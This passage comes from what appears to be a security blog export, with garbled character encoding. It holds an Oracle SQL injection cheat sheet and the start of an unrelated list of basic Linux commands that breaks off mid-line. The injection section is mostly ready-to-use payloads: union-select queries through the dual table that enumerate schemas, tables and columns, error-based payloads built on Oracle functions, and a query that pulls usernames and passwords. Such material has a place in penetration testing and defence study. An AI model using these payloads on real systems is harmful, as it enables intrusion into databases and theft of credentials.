<h2 id="4ã€dualè¡¨å®ç°è”åˆæ³¨å…¥"><a href="#4ã€dualè¡¨å®ç°è”åˆæ³¨å…¥" class="headerlink" title="4ã€dualè¡¨å®ç°è”åˆæ³¨å…¥"></a>4ã€dualè¡¨å®ç°è”åˆæ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n <span class="comment">--</span></span><br></pre></td></tr></table></figure>


<p><strong>å¼ºç±»å‹</strong>ï¼Œå­—ç¬¦ç±»å‹éœ€è¦å¯¹ä¸Šï¼Œè¿™é‡Œå¯ä»¥<strong>ä½¿ç”¨nullä»£æ›¿æ— æ³•çŒœæµ‹çš„æ•°æ®ç±»å‹</strong>ä½ç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h3 id="4-1ã€æŸ¥åº“"><a href="#4-1ã€æŸ¥åº“" class="headerlink" title="4.1ã€æŸ¥åº“"></a>4.1ã€æŸ¥åº“</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">-- </span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span><span class="string">&#x27;ç¬¬ä¸€ä¸ªæ•°æ®åº“&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;ç¬¬ä¸€ä¸ªæ•°æ®åº“&#x27;</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;ç¬¬äºŒä¸ªæ•°æ®åº“&#x27;</span>``),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="operator">-</span></span><br></pre></td></tr></table></figure>




<h3 id="4-2ã€æŸ¥è¡¨"><a href="#4-2ã€æŸ¥è¡¨" class="headerlink" title="4.2ã€æŸ¥è¡¨"></a>4.2ã€æŸ¥è¡¨</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;ç¬¬ä¸€ä¸ªè¡¨å&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h3 id="4-3ã€å­—æ®µ"><a href="#4-3ã€å­—æ®µ" class="headerlink" title="4.3ã€å­—æ®µ"></a>4.3ã€å­—æ®µ</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span>``<span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> column_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;ç¬¬ä¸€ä¸ªå­—æ®µ&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>è¯»å–æ•°æ®ï¼šå­—æ®µåéœ€è¦ç”¨<strong>åŒå¼•å·æ‹¬èµ·æ¥ï¼ï¼</strong>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;å­—æ®µå&quot;<span class="operator">||</span><span class="operator">-</span><span class="operator">||</span>&quot;å­—æ®µå&quot;, <span class="keyword">from</span> è¡¨å <span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5ã€dualè¡¨å®ç°æŠ¥é”™æ³¨å…¥"><a href="#5ã€dualè¡¨å®ç°æŠ¥é”™æ³¨å…¥" class="headerlink" title="5ã€dualè¡¨å®ç°æŠ¥é”™æ³¨å…¥"></a>5ã€dualè¡¨å®ç°æŠ¥é”™æ³¨å…¥</h2><p>dbms_xdb_version.checkin()å‡½æ•°ï¼šè·å–å½“å‰ç”¨æˆ·å</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>




<p>dbms_xdb_versionuncheckout()å‡½æ•°</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dbms_xdb_versionuncheckout(<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>




<p><code>utl_inaddr.get_host_name()å‡½æ•°</code> 8g,9g,10g,ç‰ˆæœ¬ä¸­ä¸éœ€è¦ä»»ä½•æƒé™ï¼Œ11gåŠä»¥åçš„ç‰ˆæœ¬éœ€è¦ç½‘ç»œè®¿é—®æƒé™</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> utl.inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>dbms_xdb_version.makeversioned()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>dbms_utility.sqlid_to_sqlhash()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_utility.sqlid_to_sqlhash(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">in</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>ordsys.ord_dicom.getmappingxpath()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ordsys.ord_dicom.getmappingxpath((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="keyword">user</span>,<span class="keyword">user</span>)<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>ctxsys.drithsx.sn()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h2 id="6ã€å‡å¦‚Oracleæ•°æ®åº“ä¸­æ²¡æœ‰dualè¡¨ä¹Ÿæ— æ³•è¿›è¡Œæ¢å¤çš„æƒ…å†µä¸‹ç”¨"><a href="#6ã€å‡å¦‚Oracleæ•°æ®åº“ä¸­æ²¡æœ‰dualè¡¨ä¹Ÿæ— æ³•è¿›è¡Œæ¢å¤çš„æƒ…å†µä¸‹ç”¨" class="headerlink" title="6ã€å‡å¦‚Oracleæ•°æ®åº“ä¸­æ²¡æœ‰dualè¡¨ä¹Ÿæ— æ³•è¿›è¡Œæ¢å¤çš„æƒ…å†µä¸‹ç”¨"></a>6ã€å‡å¦‚<code>Oracleæ•°æ®åº“</code>ä¸­æ²¡æœ‰dualè¡¨ä¹Ÿæ— æ³•è¿›è¡Œæ¢å¤çš„æƒ…å†µä¸‹ç”¨</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tab_columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;USERS_TPHDTZ&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+USERNAME_UTZPGF,+PASSWORD_AGKTIJ+FROM+USERS_TPHDTZ--</span></span><br></pre></td></tr></table></figure>






<p><code>&#39;</code>æŠ¥é”™ï¼Œ<code>&#39;&#39;</code>æ˜¾ç¤ºæ­£å¸¸</p>
<p>è¿”å›é”™è¯¯æ—¶ï¼Œç¡®è®¤æ˜¯Oracleæ•°æ®åº“ä¸”</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM not-a-real-table)||&#x27;</span></span><br></pre></td></tr></table></figure>


<p>æ­¤æ•°æ®åº“éœ€è¦æ˜¾å¼æŒ‡å®šè¡¨æ˜</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM dual)||&#x27;</span></span><br></pre></td></tr></table></figure>




<h2 id="7ã€å…¶ä»–payloadæ€»ç»“"><a href="#7ã€å…¶ä»–payloadæ€»ç»“" class="headerlink" title="7ã€å…¶ä»–payloadæ€»ç»“"></a>7ã€å…¶ä»–payloadæ€»ç»“</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,null..... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<p><strong>åˆ¤æ–­ç¬¬nä¸ªå­—æ®µçš„ç±»å‹ï¼Œä¾æ¬¡ç±»æ¨å³å¯</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,null...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,<span class="string">&#x27;null&#x27;</span>...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> owner, table_name <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> â€˜blahâ€™</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> â€˜blahâ€™ <span class="keyword">and</span> owner <span class="operator">=</span> â€˜fooâ€™</span><br></pre></td></tr></table></figure>

<h1 id="JAVAä¸­çš„æ³¨å…¥"><a href="#JAVAä¸­çš„æ³¨å…¥" class="headerlink" title="JAVAä¸­çš„æ³¨å…¥"></a>JAVAä¸­çš„æ³¨å…¥</h1><p>ä¼ªä»£ç æ–¹ä¾¿ç™½ç›’æŒ–æ˜ï¼Œå½“ç„¶é»‘ç›’ä¹Ÿå¯ä»¥æ‹¿æ¥åˆ¤æ–­ä¸€ä¸‹ã€‚</p>
<table>
<thead>
<tr>
<th>ç§ç±»</th>
<th>è§£é‡Š</th>
<th>ä¼ªä»£ç </th>
</tr>
</thead>
<tbody><tr>
<td>String Source</td>
<td>è¾“å…¥ç‚¹æ˜¯å­—ç¬¦ä¸²ç±»å‹</td>
<td><code>one(@RequestParam(value = &quot;username&quot;) String username)</code></td>
</tr>
<tr>
<td>List<Long></td>
<td>è¾“å…¥ç‚¹æ˜¯Longæ³›å‹(ç”¨æ¥æµ‹è¯•è¯¯æŠ¥)</td>
<td><code>longin(@RequestBody List&lt;Long&gt; user_list)</code></td>
</tr>
<tr>
<td>Optional<String></td>
<td>æ–°ç‰¹æ€§</td>
<td><code>optionalLike(@RequestParam(value = &quot;username&quot;) Optional&lt;String&gt; optinal_username)</code></td>
</tr>
<tr>
<td>List<String> Source</td>
<td>è¾“å…¥ç‚¹æ˜¯Stringæ³›å‹</td>
<td><code>in(@RequestBody List&lt;String&gt; user_list)</code></td>
</tr>
<tr>
<td>Object Source</td>
<td>å¯¹è±¡ç±»å‹</td>
<td><code>objectParam(@RequestBody Student user)</code></td>
</tr>
<tr>
<td>MyBatisæ³¨å…¥</td>
<td>XMLåˆ†ç¦»SQLæ£€æµ‹</td>
<td><code>myBatis(@RequestParam(value = &quot;name&quot;) String name)</code></td>
</tr>
<tr>
<td>Inç±»å‹æ³¨å…¥</td>
<td>Inç±»å‹æ³¨å…¥</td>
<td>å‚ç…§ä»£ç </td>
</tr>
<tr>
<td>Likeç±»å‹</td>
<td>Likeç±»å‹æ³¨å…¥</td>
<td>å‚ç…§ä»£ç </td>
</tr>
<tr>
<td>Lombok</td>
<td>Lombokå¯¹æ³¨å…¥æ¼æ´çš„å½±å“</td>
<td>å‚ç…§ä»£ç </td>
</tr>
<tr>
<td>MyBatisæ³¨è§£æ–¹å¼æ³¨å…¥</td>
<td>MyBatisæ³¨è§£æ–¹å¼æ³¨å…¥</td>
<td>å‚ç…§ä»£ç </td>
</tr>
<tr>
<td>Spring Data JPA</td>
<td>JPA æ–¹å¼</td>
<td>å‚ç…§ä»£ç </td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>SQLInject</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxç®€å•æ€»ç»“</title>
    <url>/Linux/Linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ”¶é›†ä¸€äº›å¸¸ç”¨çš„ï¼Œå…å¾—æˆ‘å¿˜è®°äº†Îµ&#x3D;Îµ&#x3D;Îµ&#x3D;(<del>ï¿£â–½ï¿£)</del></p>
<span id="more"></span>

<h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="åŸºæœ¬å‘½ä»¤"><a href="#åŸºæœ¬å‘½ä»¤" class="headerlink" title="åŸºæœ¬å‘½ä»¤"></a>åŸºæœ¬å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -m                             æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„</span><br><span class="line">uname -r                             æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬</span><br><span class="line">dmidecode -q                         æ˜¾ç¤ºç¡¬ä»¶ç³»ç»Ÿéƒ¨ä»¶</span><br><span class="line">(SMBIOS / DMI) hdparm -i /dev/hda    ç½—åˆ—ä¸€ä¸ªç£ç›˜çš„æ¶æ„ç‰¹æ€§</span><br><span class="line">hdparm -tT /dev/sda                  åœ¨ç£ç›˜ä¸Šæ‰§è¡Œæµ‹è¯•æ€§è¯»å–æ“ä½œç³»ç»Ÿä¿¡æ¯</span><br><span class="line">arch                                 æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„</span><br><span class="line">uname -m                             æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„</span><br><span class="line">uname -r                             æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬</span><br><span class="line">dmidecode -q                         æ˜¾ç¤ºç¡¬ä»¶ç³»ç»Ÿéƒ¨ä»¶ - (SMBIOS / DMI)</span><br><span class="line">hdparm -i /dev/hda                   ç½—åˆ—ä¸€ä¸ªç£ç›˜çš„æ¶æ„ç‰¹æ€§</span><br><span class="line">hdparm -tT /dev/sda                  åœ¨ç£ç›˜ä¸Šæ‰§è¡Œæµ‹è¯•æ€§è¯»å–æ“ä½œ</span><br><span class="line">cat /proc/cpuinfo                    æ˜¾ç¤ºCPU infoçš„ä¿¡æ¯</span><br><span class="line">cat /proc/interrupts                 æ˜¾ç¤ºä¸­æ–­</span><br><span class="line">cat /proc/meminfo                    æ ¡éªŒå†…å­˜ä½¿ç”¨</span><br><span class="line">cat /proc/swaps                      æ˜¾ç¤ºå“ªäº›swapè¢«ä½¿ç”¨</span><br><span class="line">cat /proc/version                    æ˜¾ç¤ºå†…æ ¸çš„ç‰ˆæœ¬</span><br><span class="line">cat /proc/net/dev                    æ˜¾ç¤ºç½‘ç»œé€‚é…å™¨åŠç»Ÿè®¡</span><br><span class="line">cat /proc/mounts                     æ˜¾ç¤ºå·²åŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">lspci -tv                            ç½—åˆ— PCI è®¾å¤‡</span><br><span class="line">lsusb -tv                            æ˜¾ç¤º USB è®¾å¤‡</span><br><span class="line">date                                 æ˜¾ç¤ºç³»ç»Ÿæ—¥æœŸ</span><br><span class="line">cal 2007                             æ˜¾ç¤º2007å¹´çš„æ—¥å†è¡¨</span><br><span class="line">date 041217002007.00                 è®¾ç½®æ—¥æœŸå’Œæ—¶é—´ - æœˆæ—¥æ—¶åˆ†å¹´.ç§’</span><br><span class="line">clock -w                             å°†æ—¶é—´ä¿®æ”¹ä¿å­˜åˆ° BIOS</span><br></pre></td></tr></table></figure>

<h2 id="å…³æœº-and-é‡å¯"><a href="#å…³æœº-and-é‡å¯" class="headerlink" title="å…³æœº and é‡å¯"></a>å…³æœº and é‡å¯</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now             å…³é—­ç³»ç»Ÿ(1)</span><br><span class="line">init 0                      å…³é—­ç³»ç»Ÿ(2)</span><br><span class="line">telinit 0                   å…³é—­ç³»ç»Ÿ(3)</span><br><span class="line">shutdown -h hours:minutes &amp; æŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿ</span><br><span class="line">shutdown -h +10             10åˆ†é’Ÿåå…³æœº</span><br><span class="line">shutdown -c                 å–æ¶ˆæŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿ</span><br><span class="line">shutdown -r now             é‡å¯</span><br><span class="line">reboot                      é‡å¯</span><br><span class="line">logout                      æ³¨é”€</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶å’Œç›®å½•"><a href="#æ–‡ä»¶å’Œç›®å½•" class="headerlink" title="æ–‡ä»¶å’Œç›®å½•"></a>æ–‡ä»¶å’Œç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home                      è¿›å…¥ / home ç›®å½•</span><br><span class="line">cd ..                         è¿”å›ä¸Šä¸€çº§ç›®å½•</span><br><span class="line">cd ../..                      è¿”å›ä¸Šä¸¤çº§ç›®å½•</span><br><span class="line">cd                            è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½•</span><br><span class="line">cd ~user1                     è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½•</span><br><span class="line">cd -                          è¿”å›ä¸Šæ¬¡æ‰€åœ¨çš„ç›®å½•</span><br><span class="line">pwd                           æ˜¾ç¤ºå·¥ä½œè·¯å¾„</span><br><span class="line">ls                            æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶</span><br><span class="line">ls -F                         æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶</span><br><span class="line">ls -l                         æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„è¯¦ç»†èµ„æ–™</span><br><span class="line">ls -a                         æ˜¾ç¤ºéšè—æ–‡ä»¶</span><br><span class="line">ls *[0-9]*                    æ˜¾ç¤ºåŒ…å«æ•°å­—çš„æ–‡ä»¶åå’Œç›®å½•å</span><br><span class="line">tree                          æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„(1)</span><br><span class="line">lstree                        æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„(2)</span><br><span class="line">mkdir dir1                    åˆ›å»ºä¸€ä¸ªå«åš dir1 çš„ç›®å½•</span><br><span class="line">mkdir dir1 dir2               åŒæ—¶åˆ›å»ºä¸¤ä¸ªç›®å½•</span><br><span class="line">mkdir -p /tmp/dir1/dir2       åˆ›å»ºä¸€ä¸ªç›®å½•æ ‘</span><br><span class="line">mv dir1 new_dir               é‡å‘½å/ç§»åŠ¨ ä¸€ä¸ªç›®å½•</span><br><span class="line">cp file1 file2                å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">cp dir/* .                    å¤åˆ¶ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åˆ°å½“å‰å·¥ä½œç›®å½•</span><br><span class="line">cp -a /tmp/dir1 .             å¤åˆ¶ä¸€ä¸ªç›®å½•åˆ°å½“å‰å·¥ä½œç›®å½•</span><br><span class="line">cp -a dir1 dir2               å¤åˆ¶ä¸€ä¸ªç›®å½•</span><br><span class="line">ln -s file1 lnk1              åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„è½¯é“¾æ¥</span><br><span class="line">ln file1 lnk1                 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„ç‰©ç†é“¾æ¥</span><br><span class="line">touch -t 0712250000 file1     ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„æ—¶é—´æˆ³ </span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶æœç´¢"><a href="#æ–‡ä»¶æœç´¢" class="headerlink" title="æ–‡ä»¶æœç´¢"></a>æ–‡ä»¶æœç´¢</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -name *liuyazhuang*     æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹åç§°ä¸­å«æœ‰&quot;liuyazhuang&quot;çš„æ–‡ä»¶</span><br><span class="line">find / -name *.conf            æŸ¥æ‰¾æ ¹ç›®å½•ä¸‹ï¼ˆæ•´ä¸ªç¡¬ç›˜ï¼‰ä¸‹åç¼€ä¸º.confçš„æ–‡ä»¶</span><br><span class="line">find / -perm 777               æŸ¥æ‰¾æ‰€æœ‰æƒé™æ˜¯777çš„æ–‡ä»¶</span><br><span class="line">find / -type d                 è¿”å›æ ¹ç›®å½•ä¸‹æ‰€æœ‰çš„ç›®å½•</span><br><span class="line">whereis halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€æºç æˆ–mançš„ä½ç½®</span><br><span class="line">which halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶çš„æƒé™-ä½¿ç”¨-â€œ-â€-è®¾ç½®æƒé™ï¼Œä½¿ç”¨-â€œ-â€-ç”¨äºå–æ¶ˆ"><a href="#æ–‡ä»¶çš„æƒé™-ä½¿ç”¨-â€œ-â€-è®¾ç½®æƒé™ï¼Œä½¿ç”¨-â€œ-â€-ç”¨äºå–æ¶ˆ" class="headerlink" title="æ–‡ä»¶çš„æƒé™  ä½¿ç”¨ â€œ+â€ è®¾ç½®æƒé™ï¼Œä½¿ç”¨ â€œ-â€ ç”¨äºå–æ¶ˆ"></a>æ–‡ä»¶çš„æƒé™  ä½¿ç”¨ â€œ+â€ è®¾ç½®æƒé™ï¼Œä½¿ç”¨ â€œ-â€ ç”¨äºå–æ¶ˆ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lh                      æ˜¾ç¤ºæƒé™</span><br><span class="line">ls /tmp | pr -T5 -W$COLUMNS å°†ç»ˆç«¯åˆ’åˆ†æˆ5æ æ˜¾ç¤º</span><br><span class="line">chmod ugo+rwx directory1    è®¾ç½®ç›®å½•çš„æ‰€æœ‰äºº(u)ã€ç¾¤ç»„(g)ä»¥åŠå…¶ä»–äºº(o)ä»¥è¯»ï¼ˆr ï¼‰ã€å†™(w)å’Œæ‰§è¡Œ(x)çš„æƒé™</span><br><span class="line">chmod go-rwx directory1     åˆ é™¤ç¾¤ç»„(g)ä¸å…¶ä»–äºº(o)å¯¹ç›®å½•çš„è¯»å†™æ‰§è¡Œæƒé™</span><br><span class="line">chown user1 file1           æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰äººå±æ€§</span><br><span class="line">chown -R user1 directory1   æ”¹å˜ä¸€ä¸ªç›®å½•çš„æ‰€æœ‰äººå±æ€§å¹¶åŒæ—¶æ”¹å˜æ”¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å±æ€§</span><br><span class="line">chgrp group1 file1          æ”¹å˜æ–‡ä»¶çš„ç¾¤ç»„</span><br><span class="line">chown user1:group1 file1    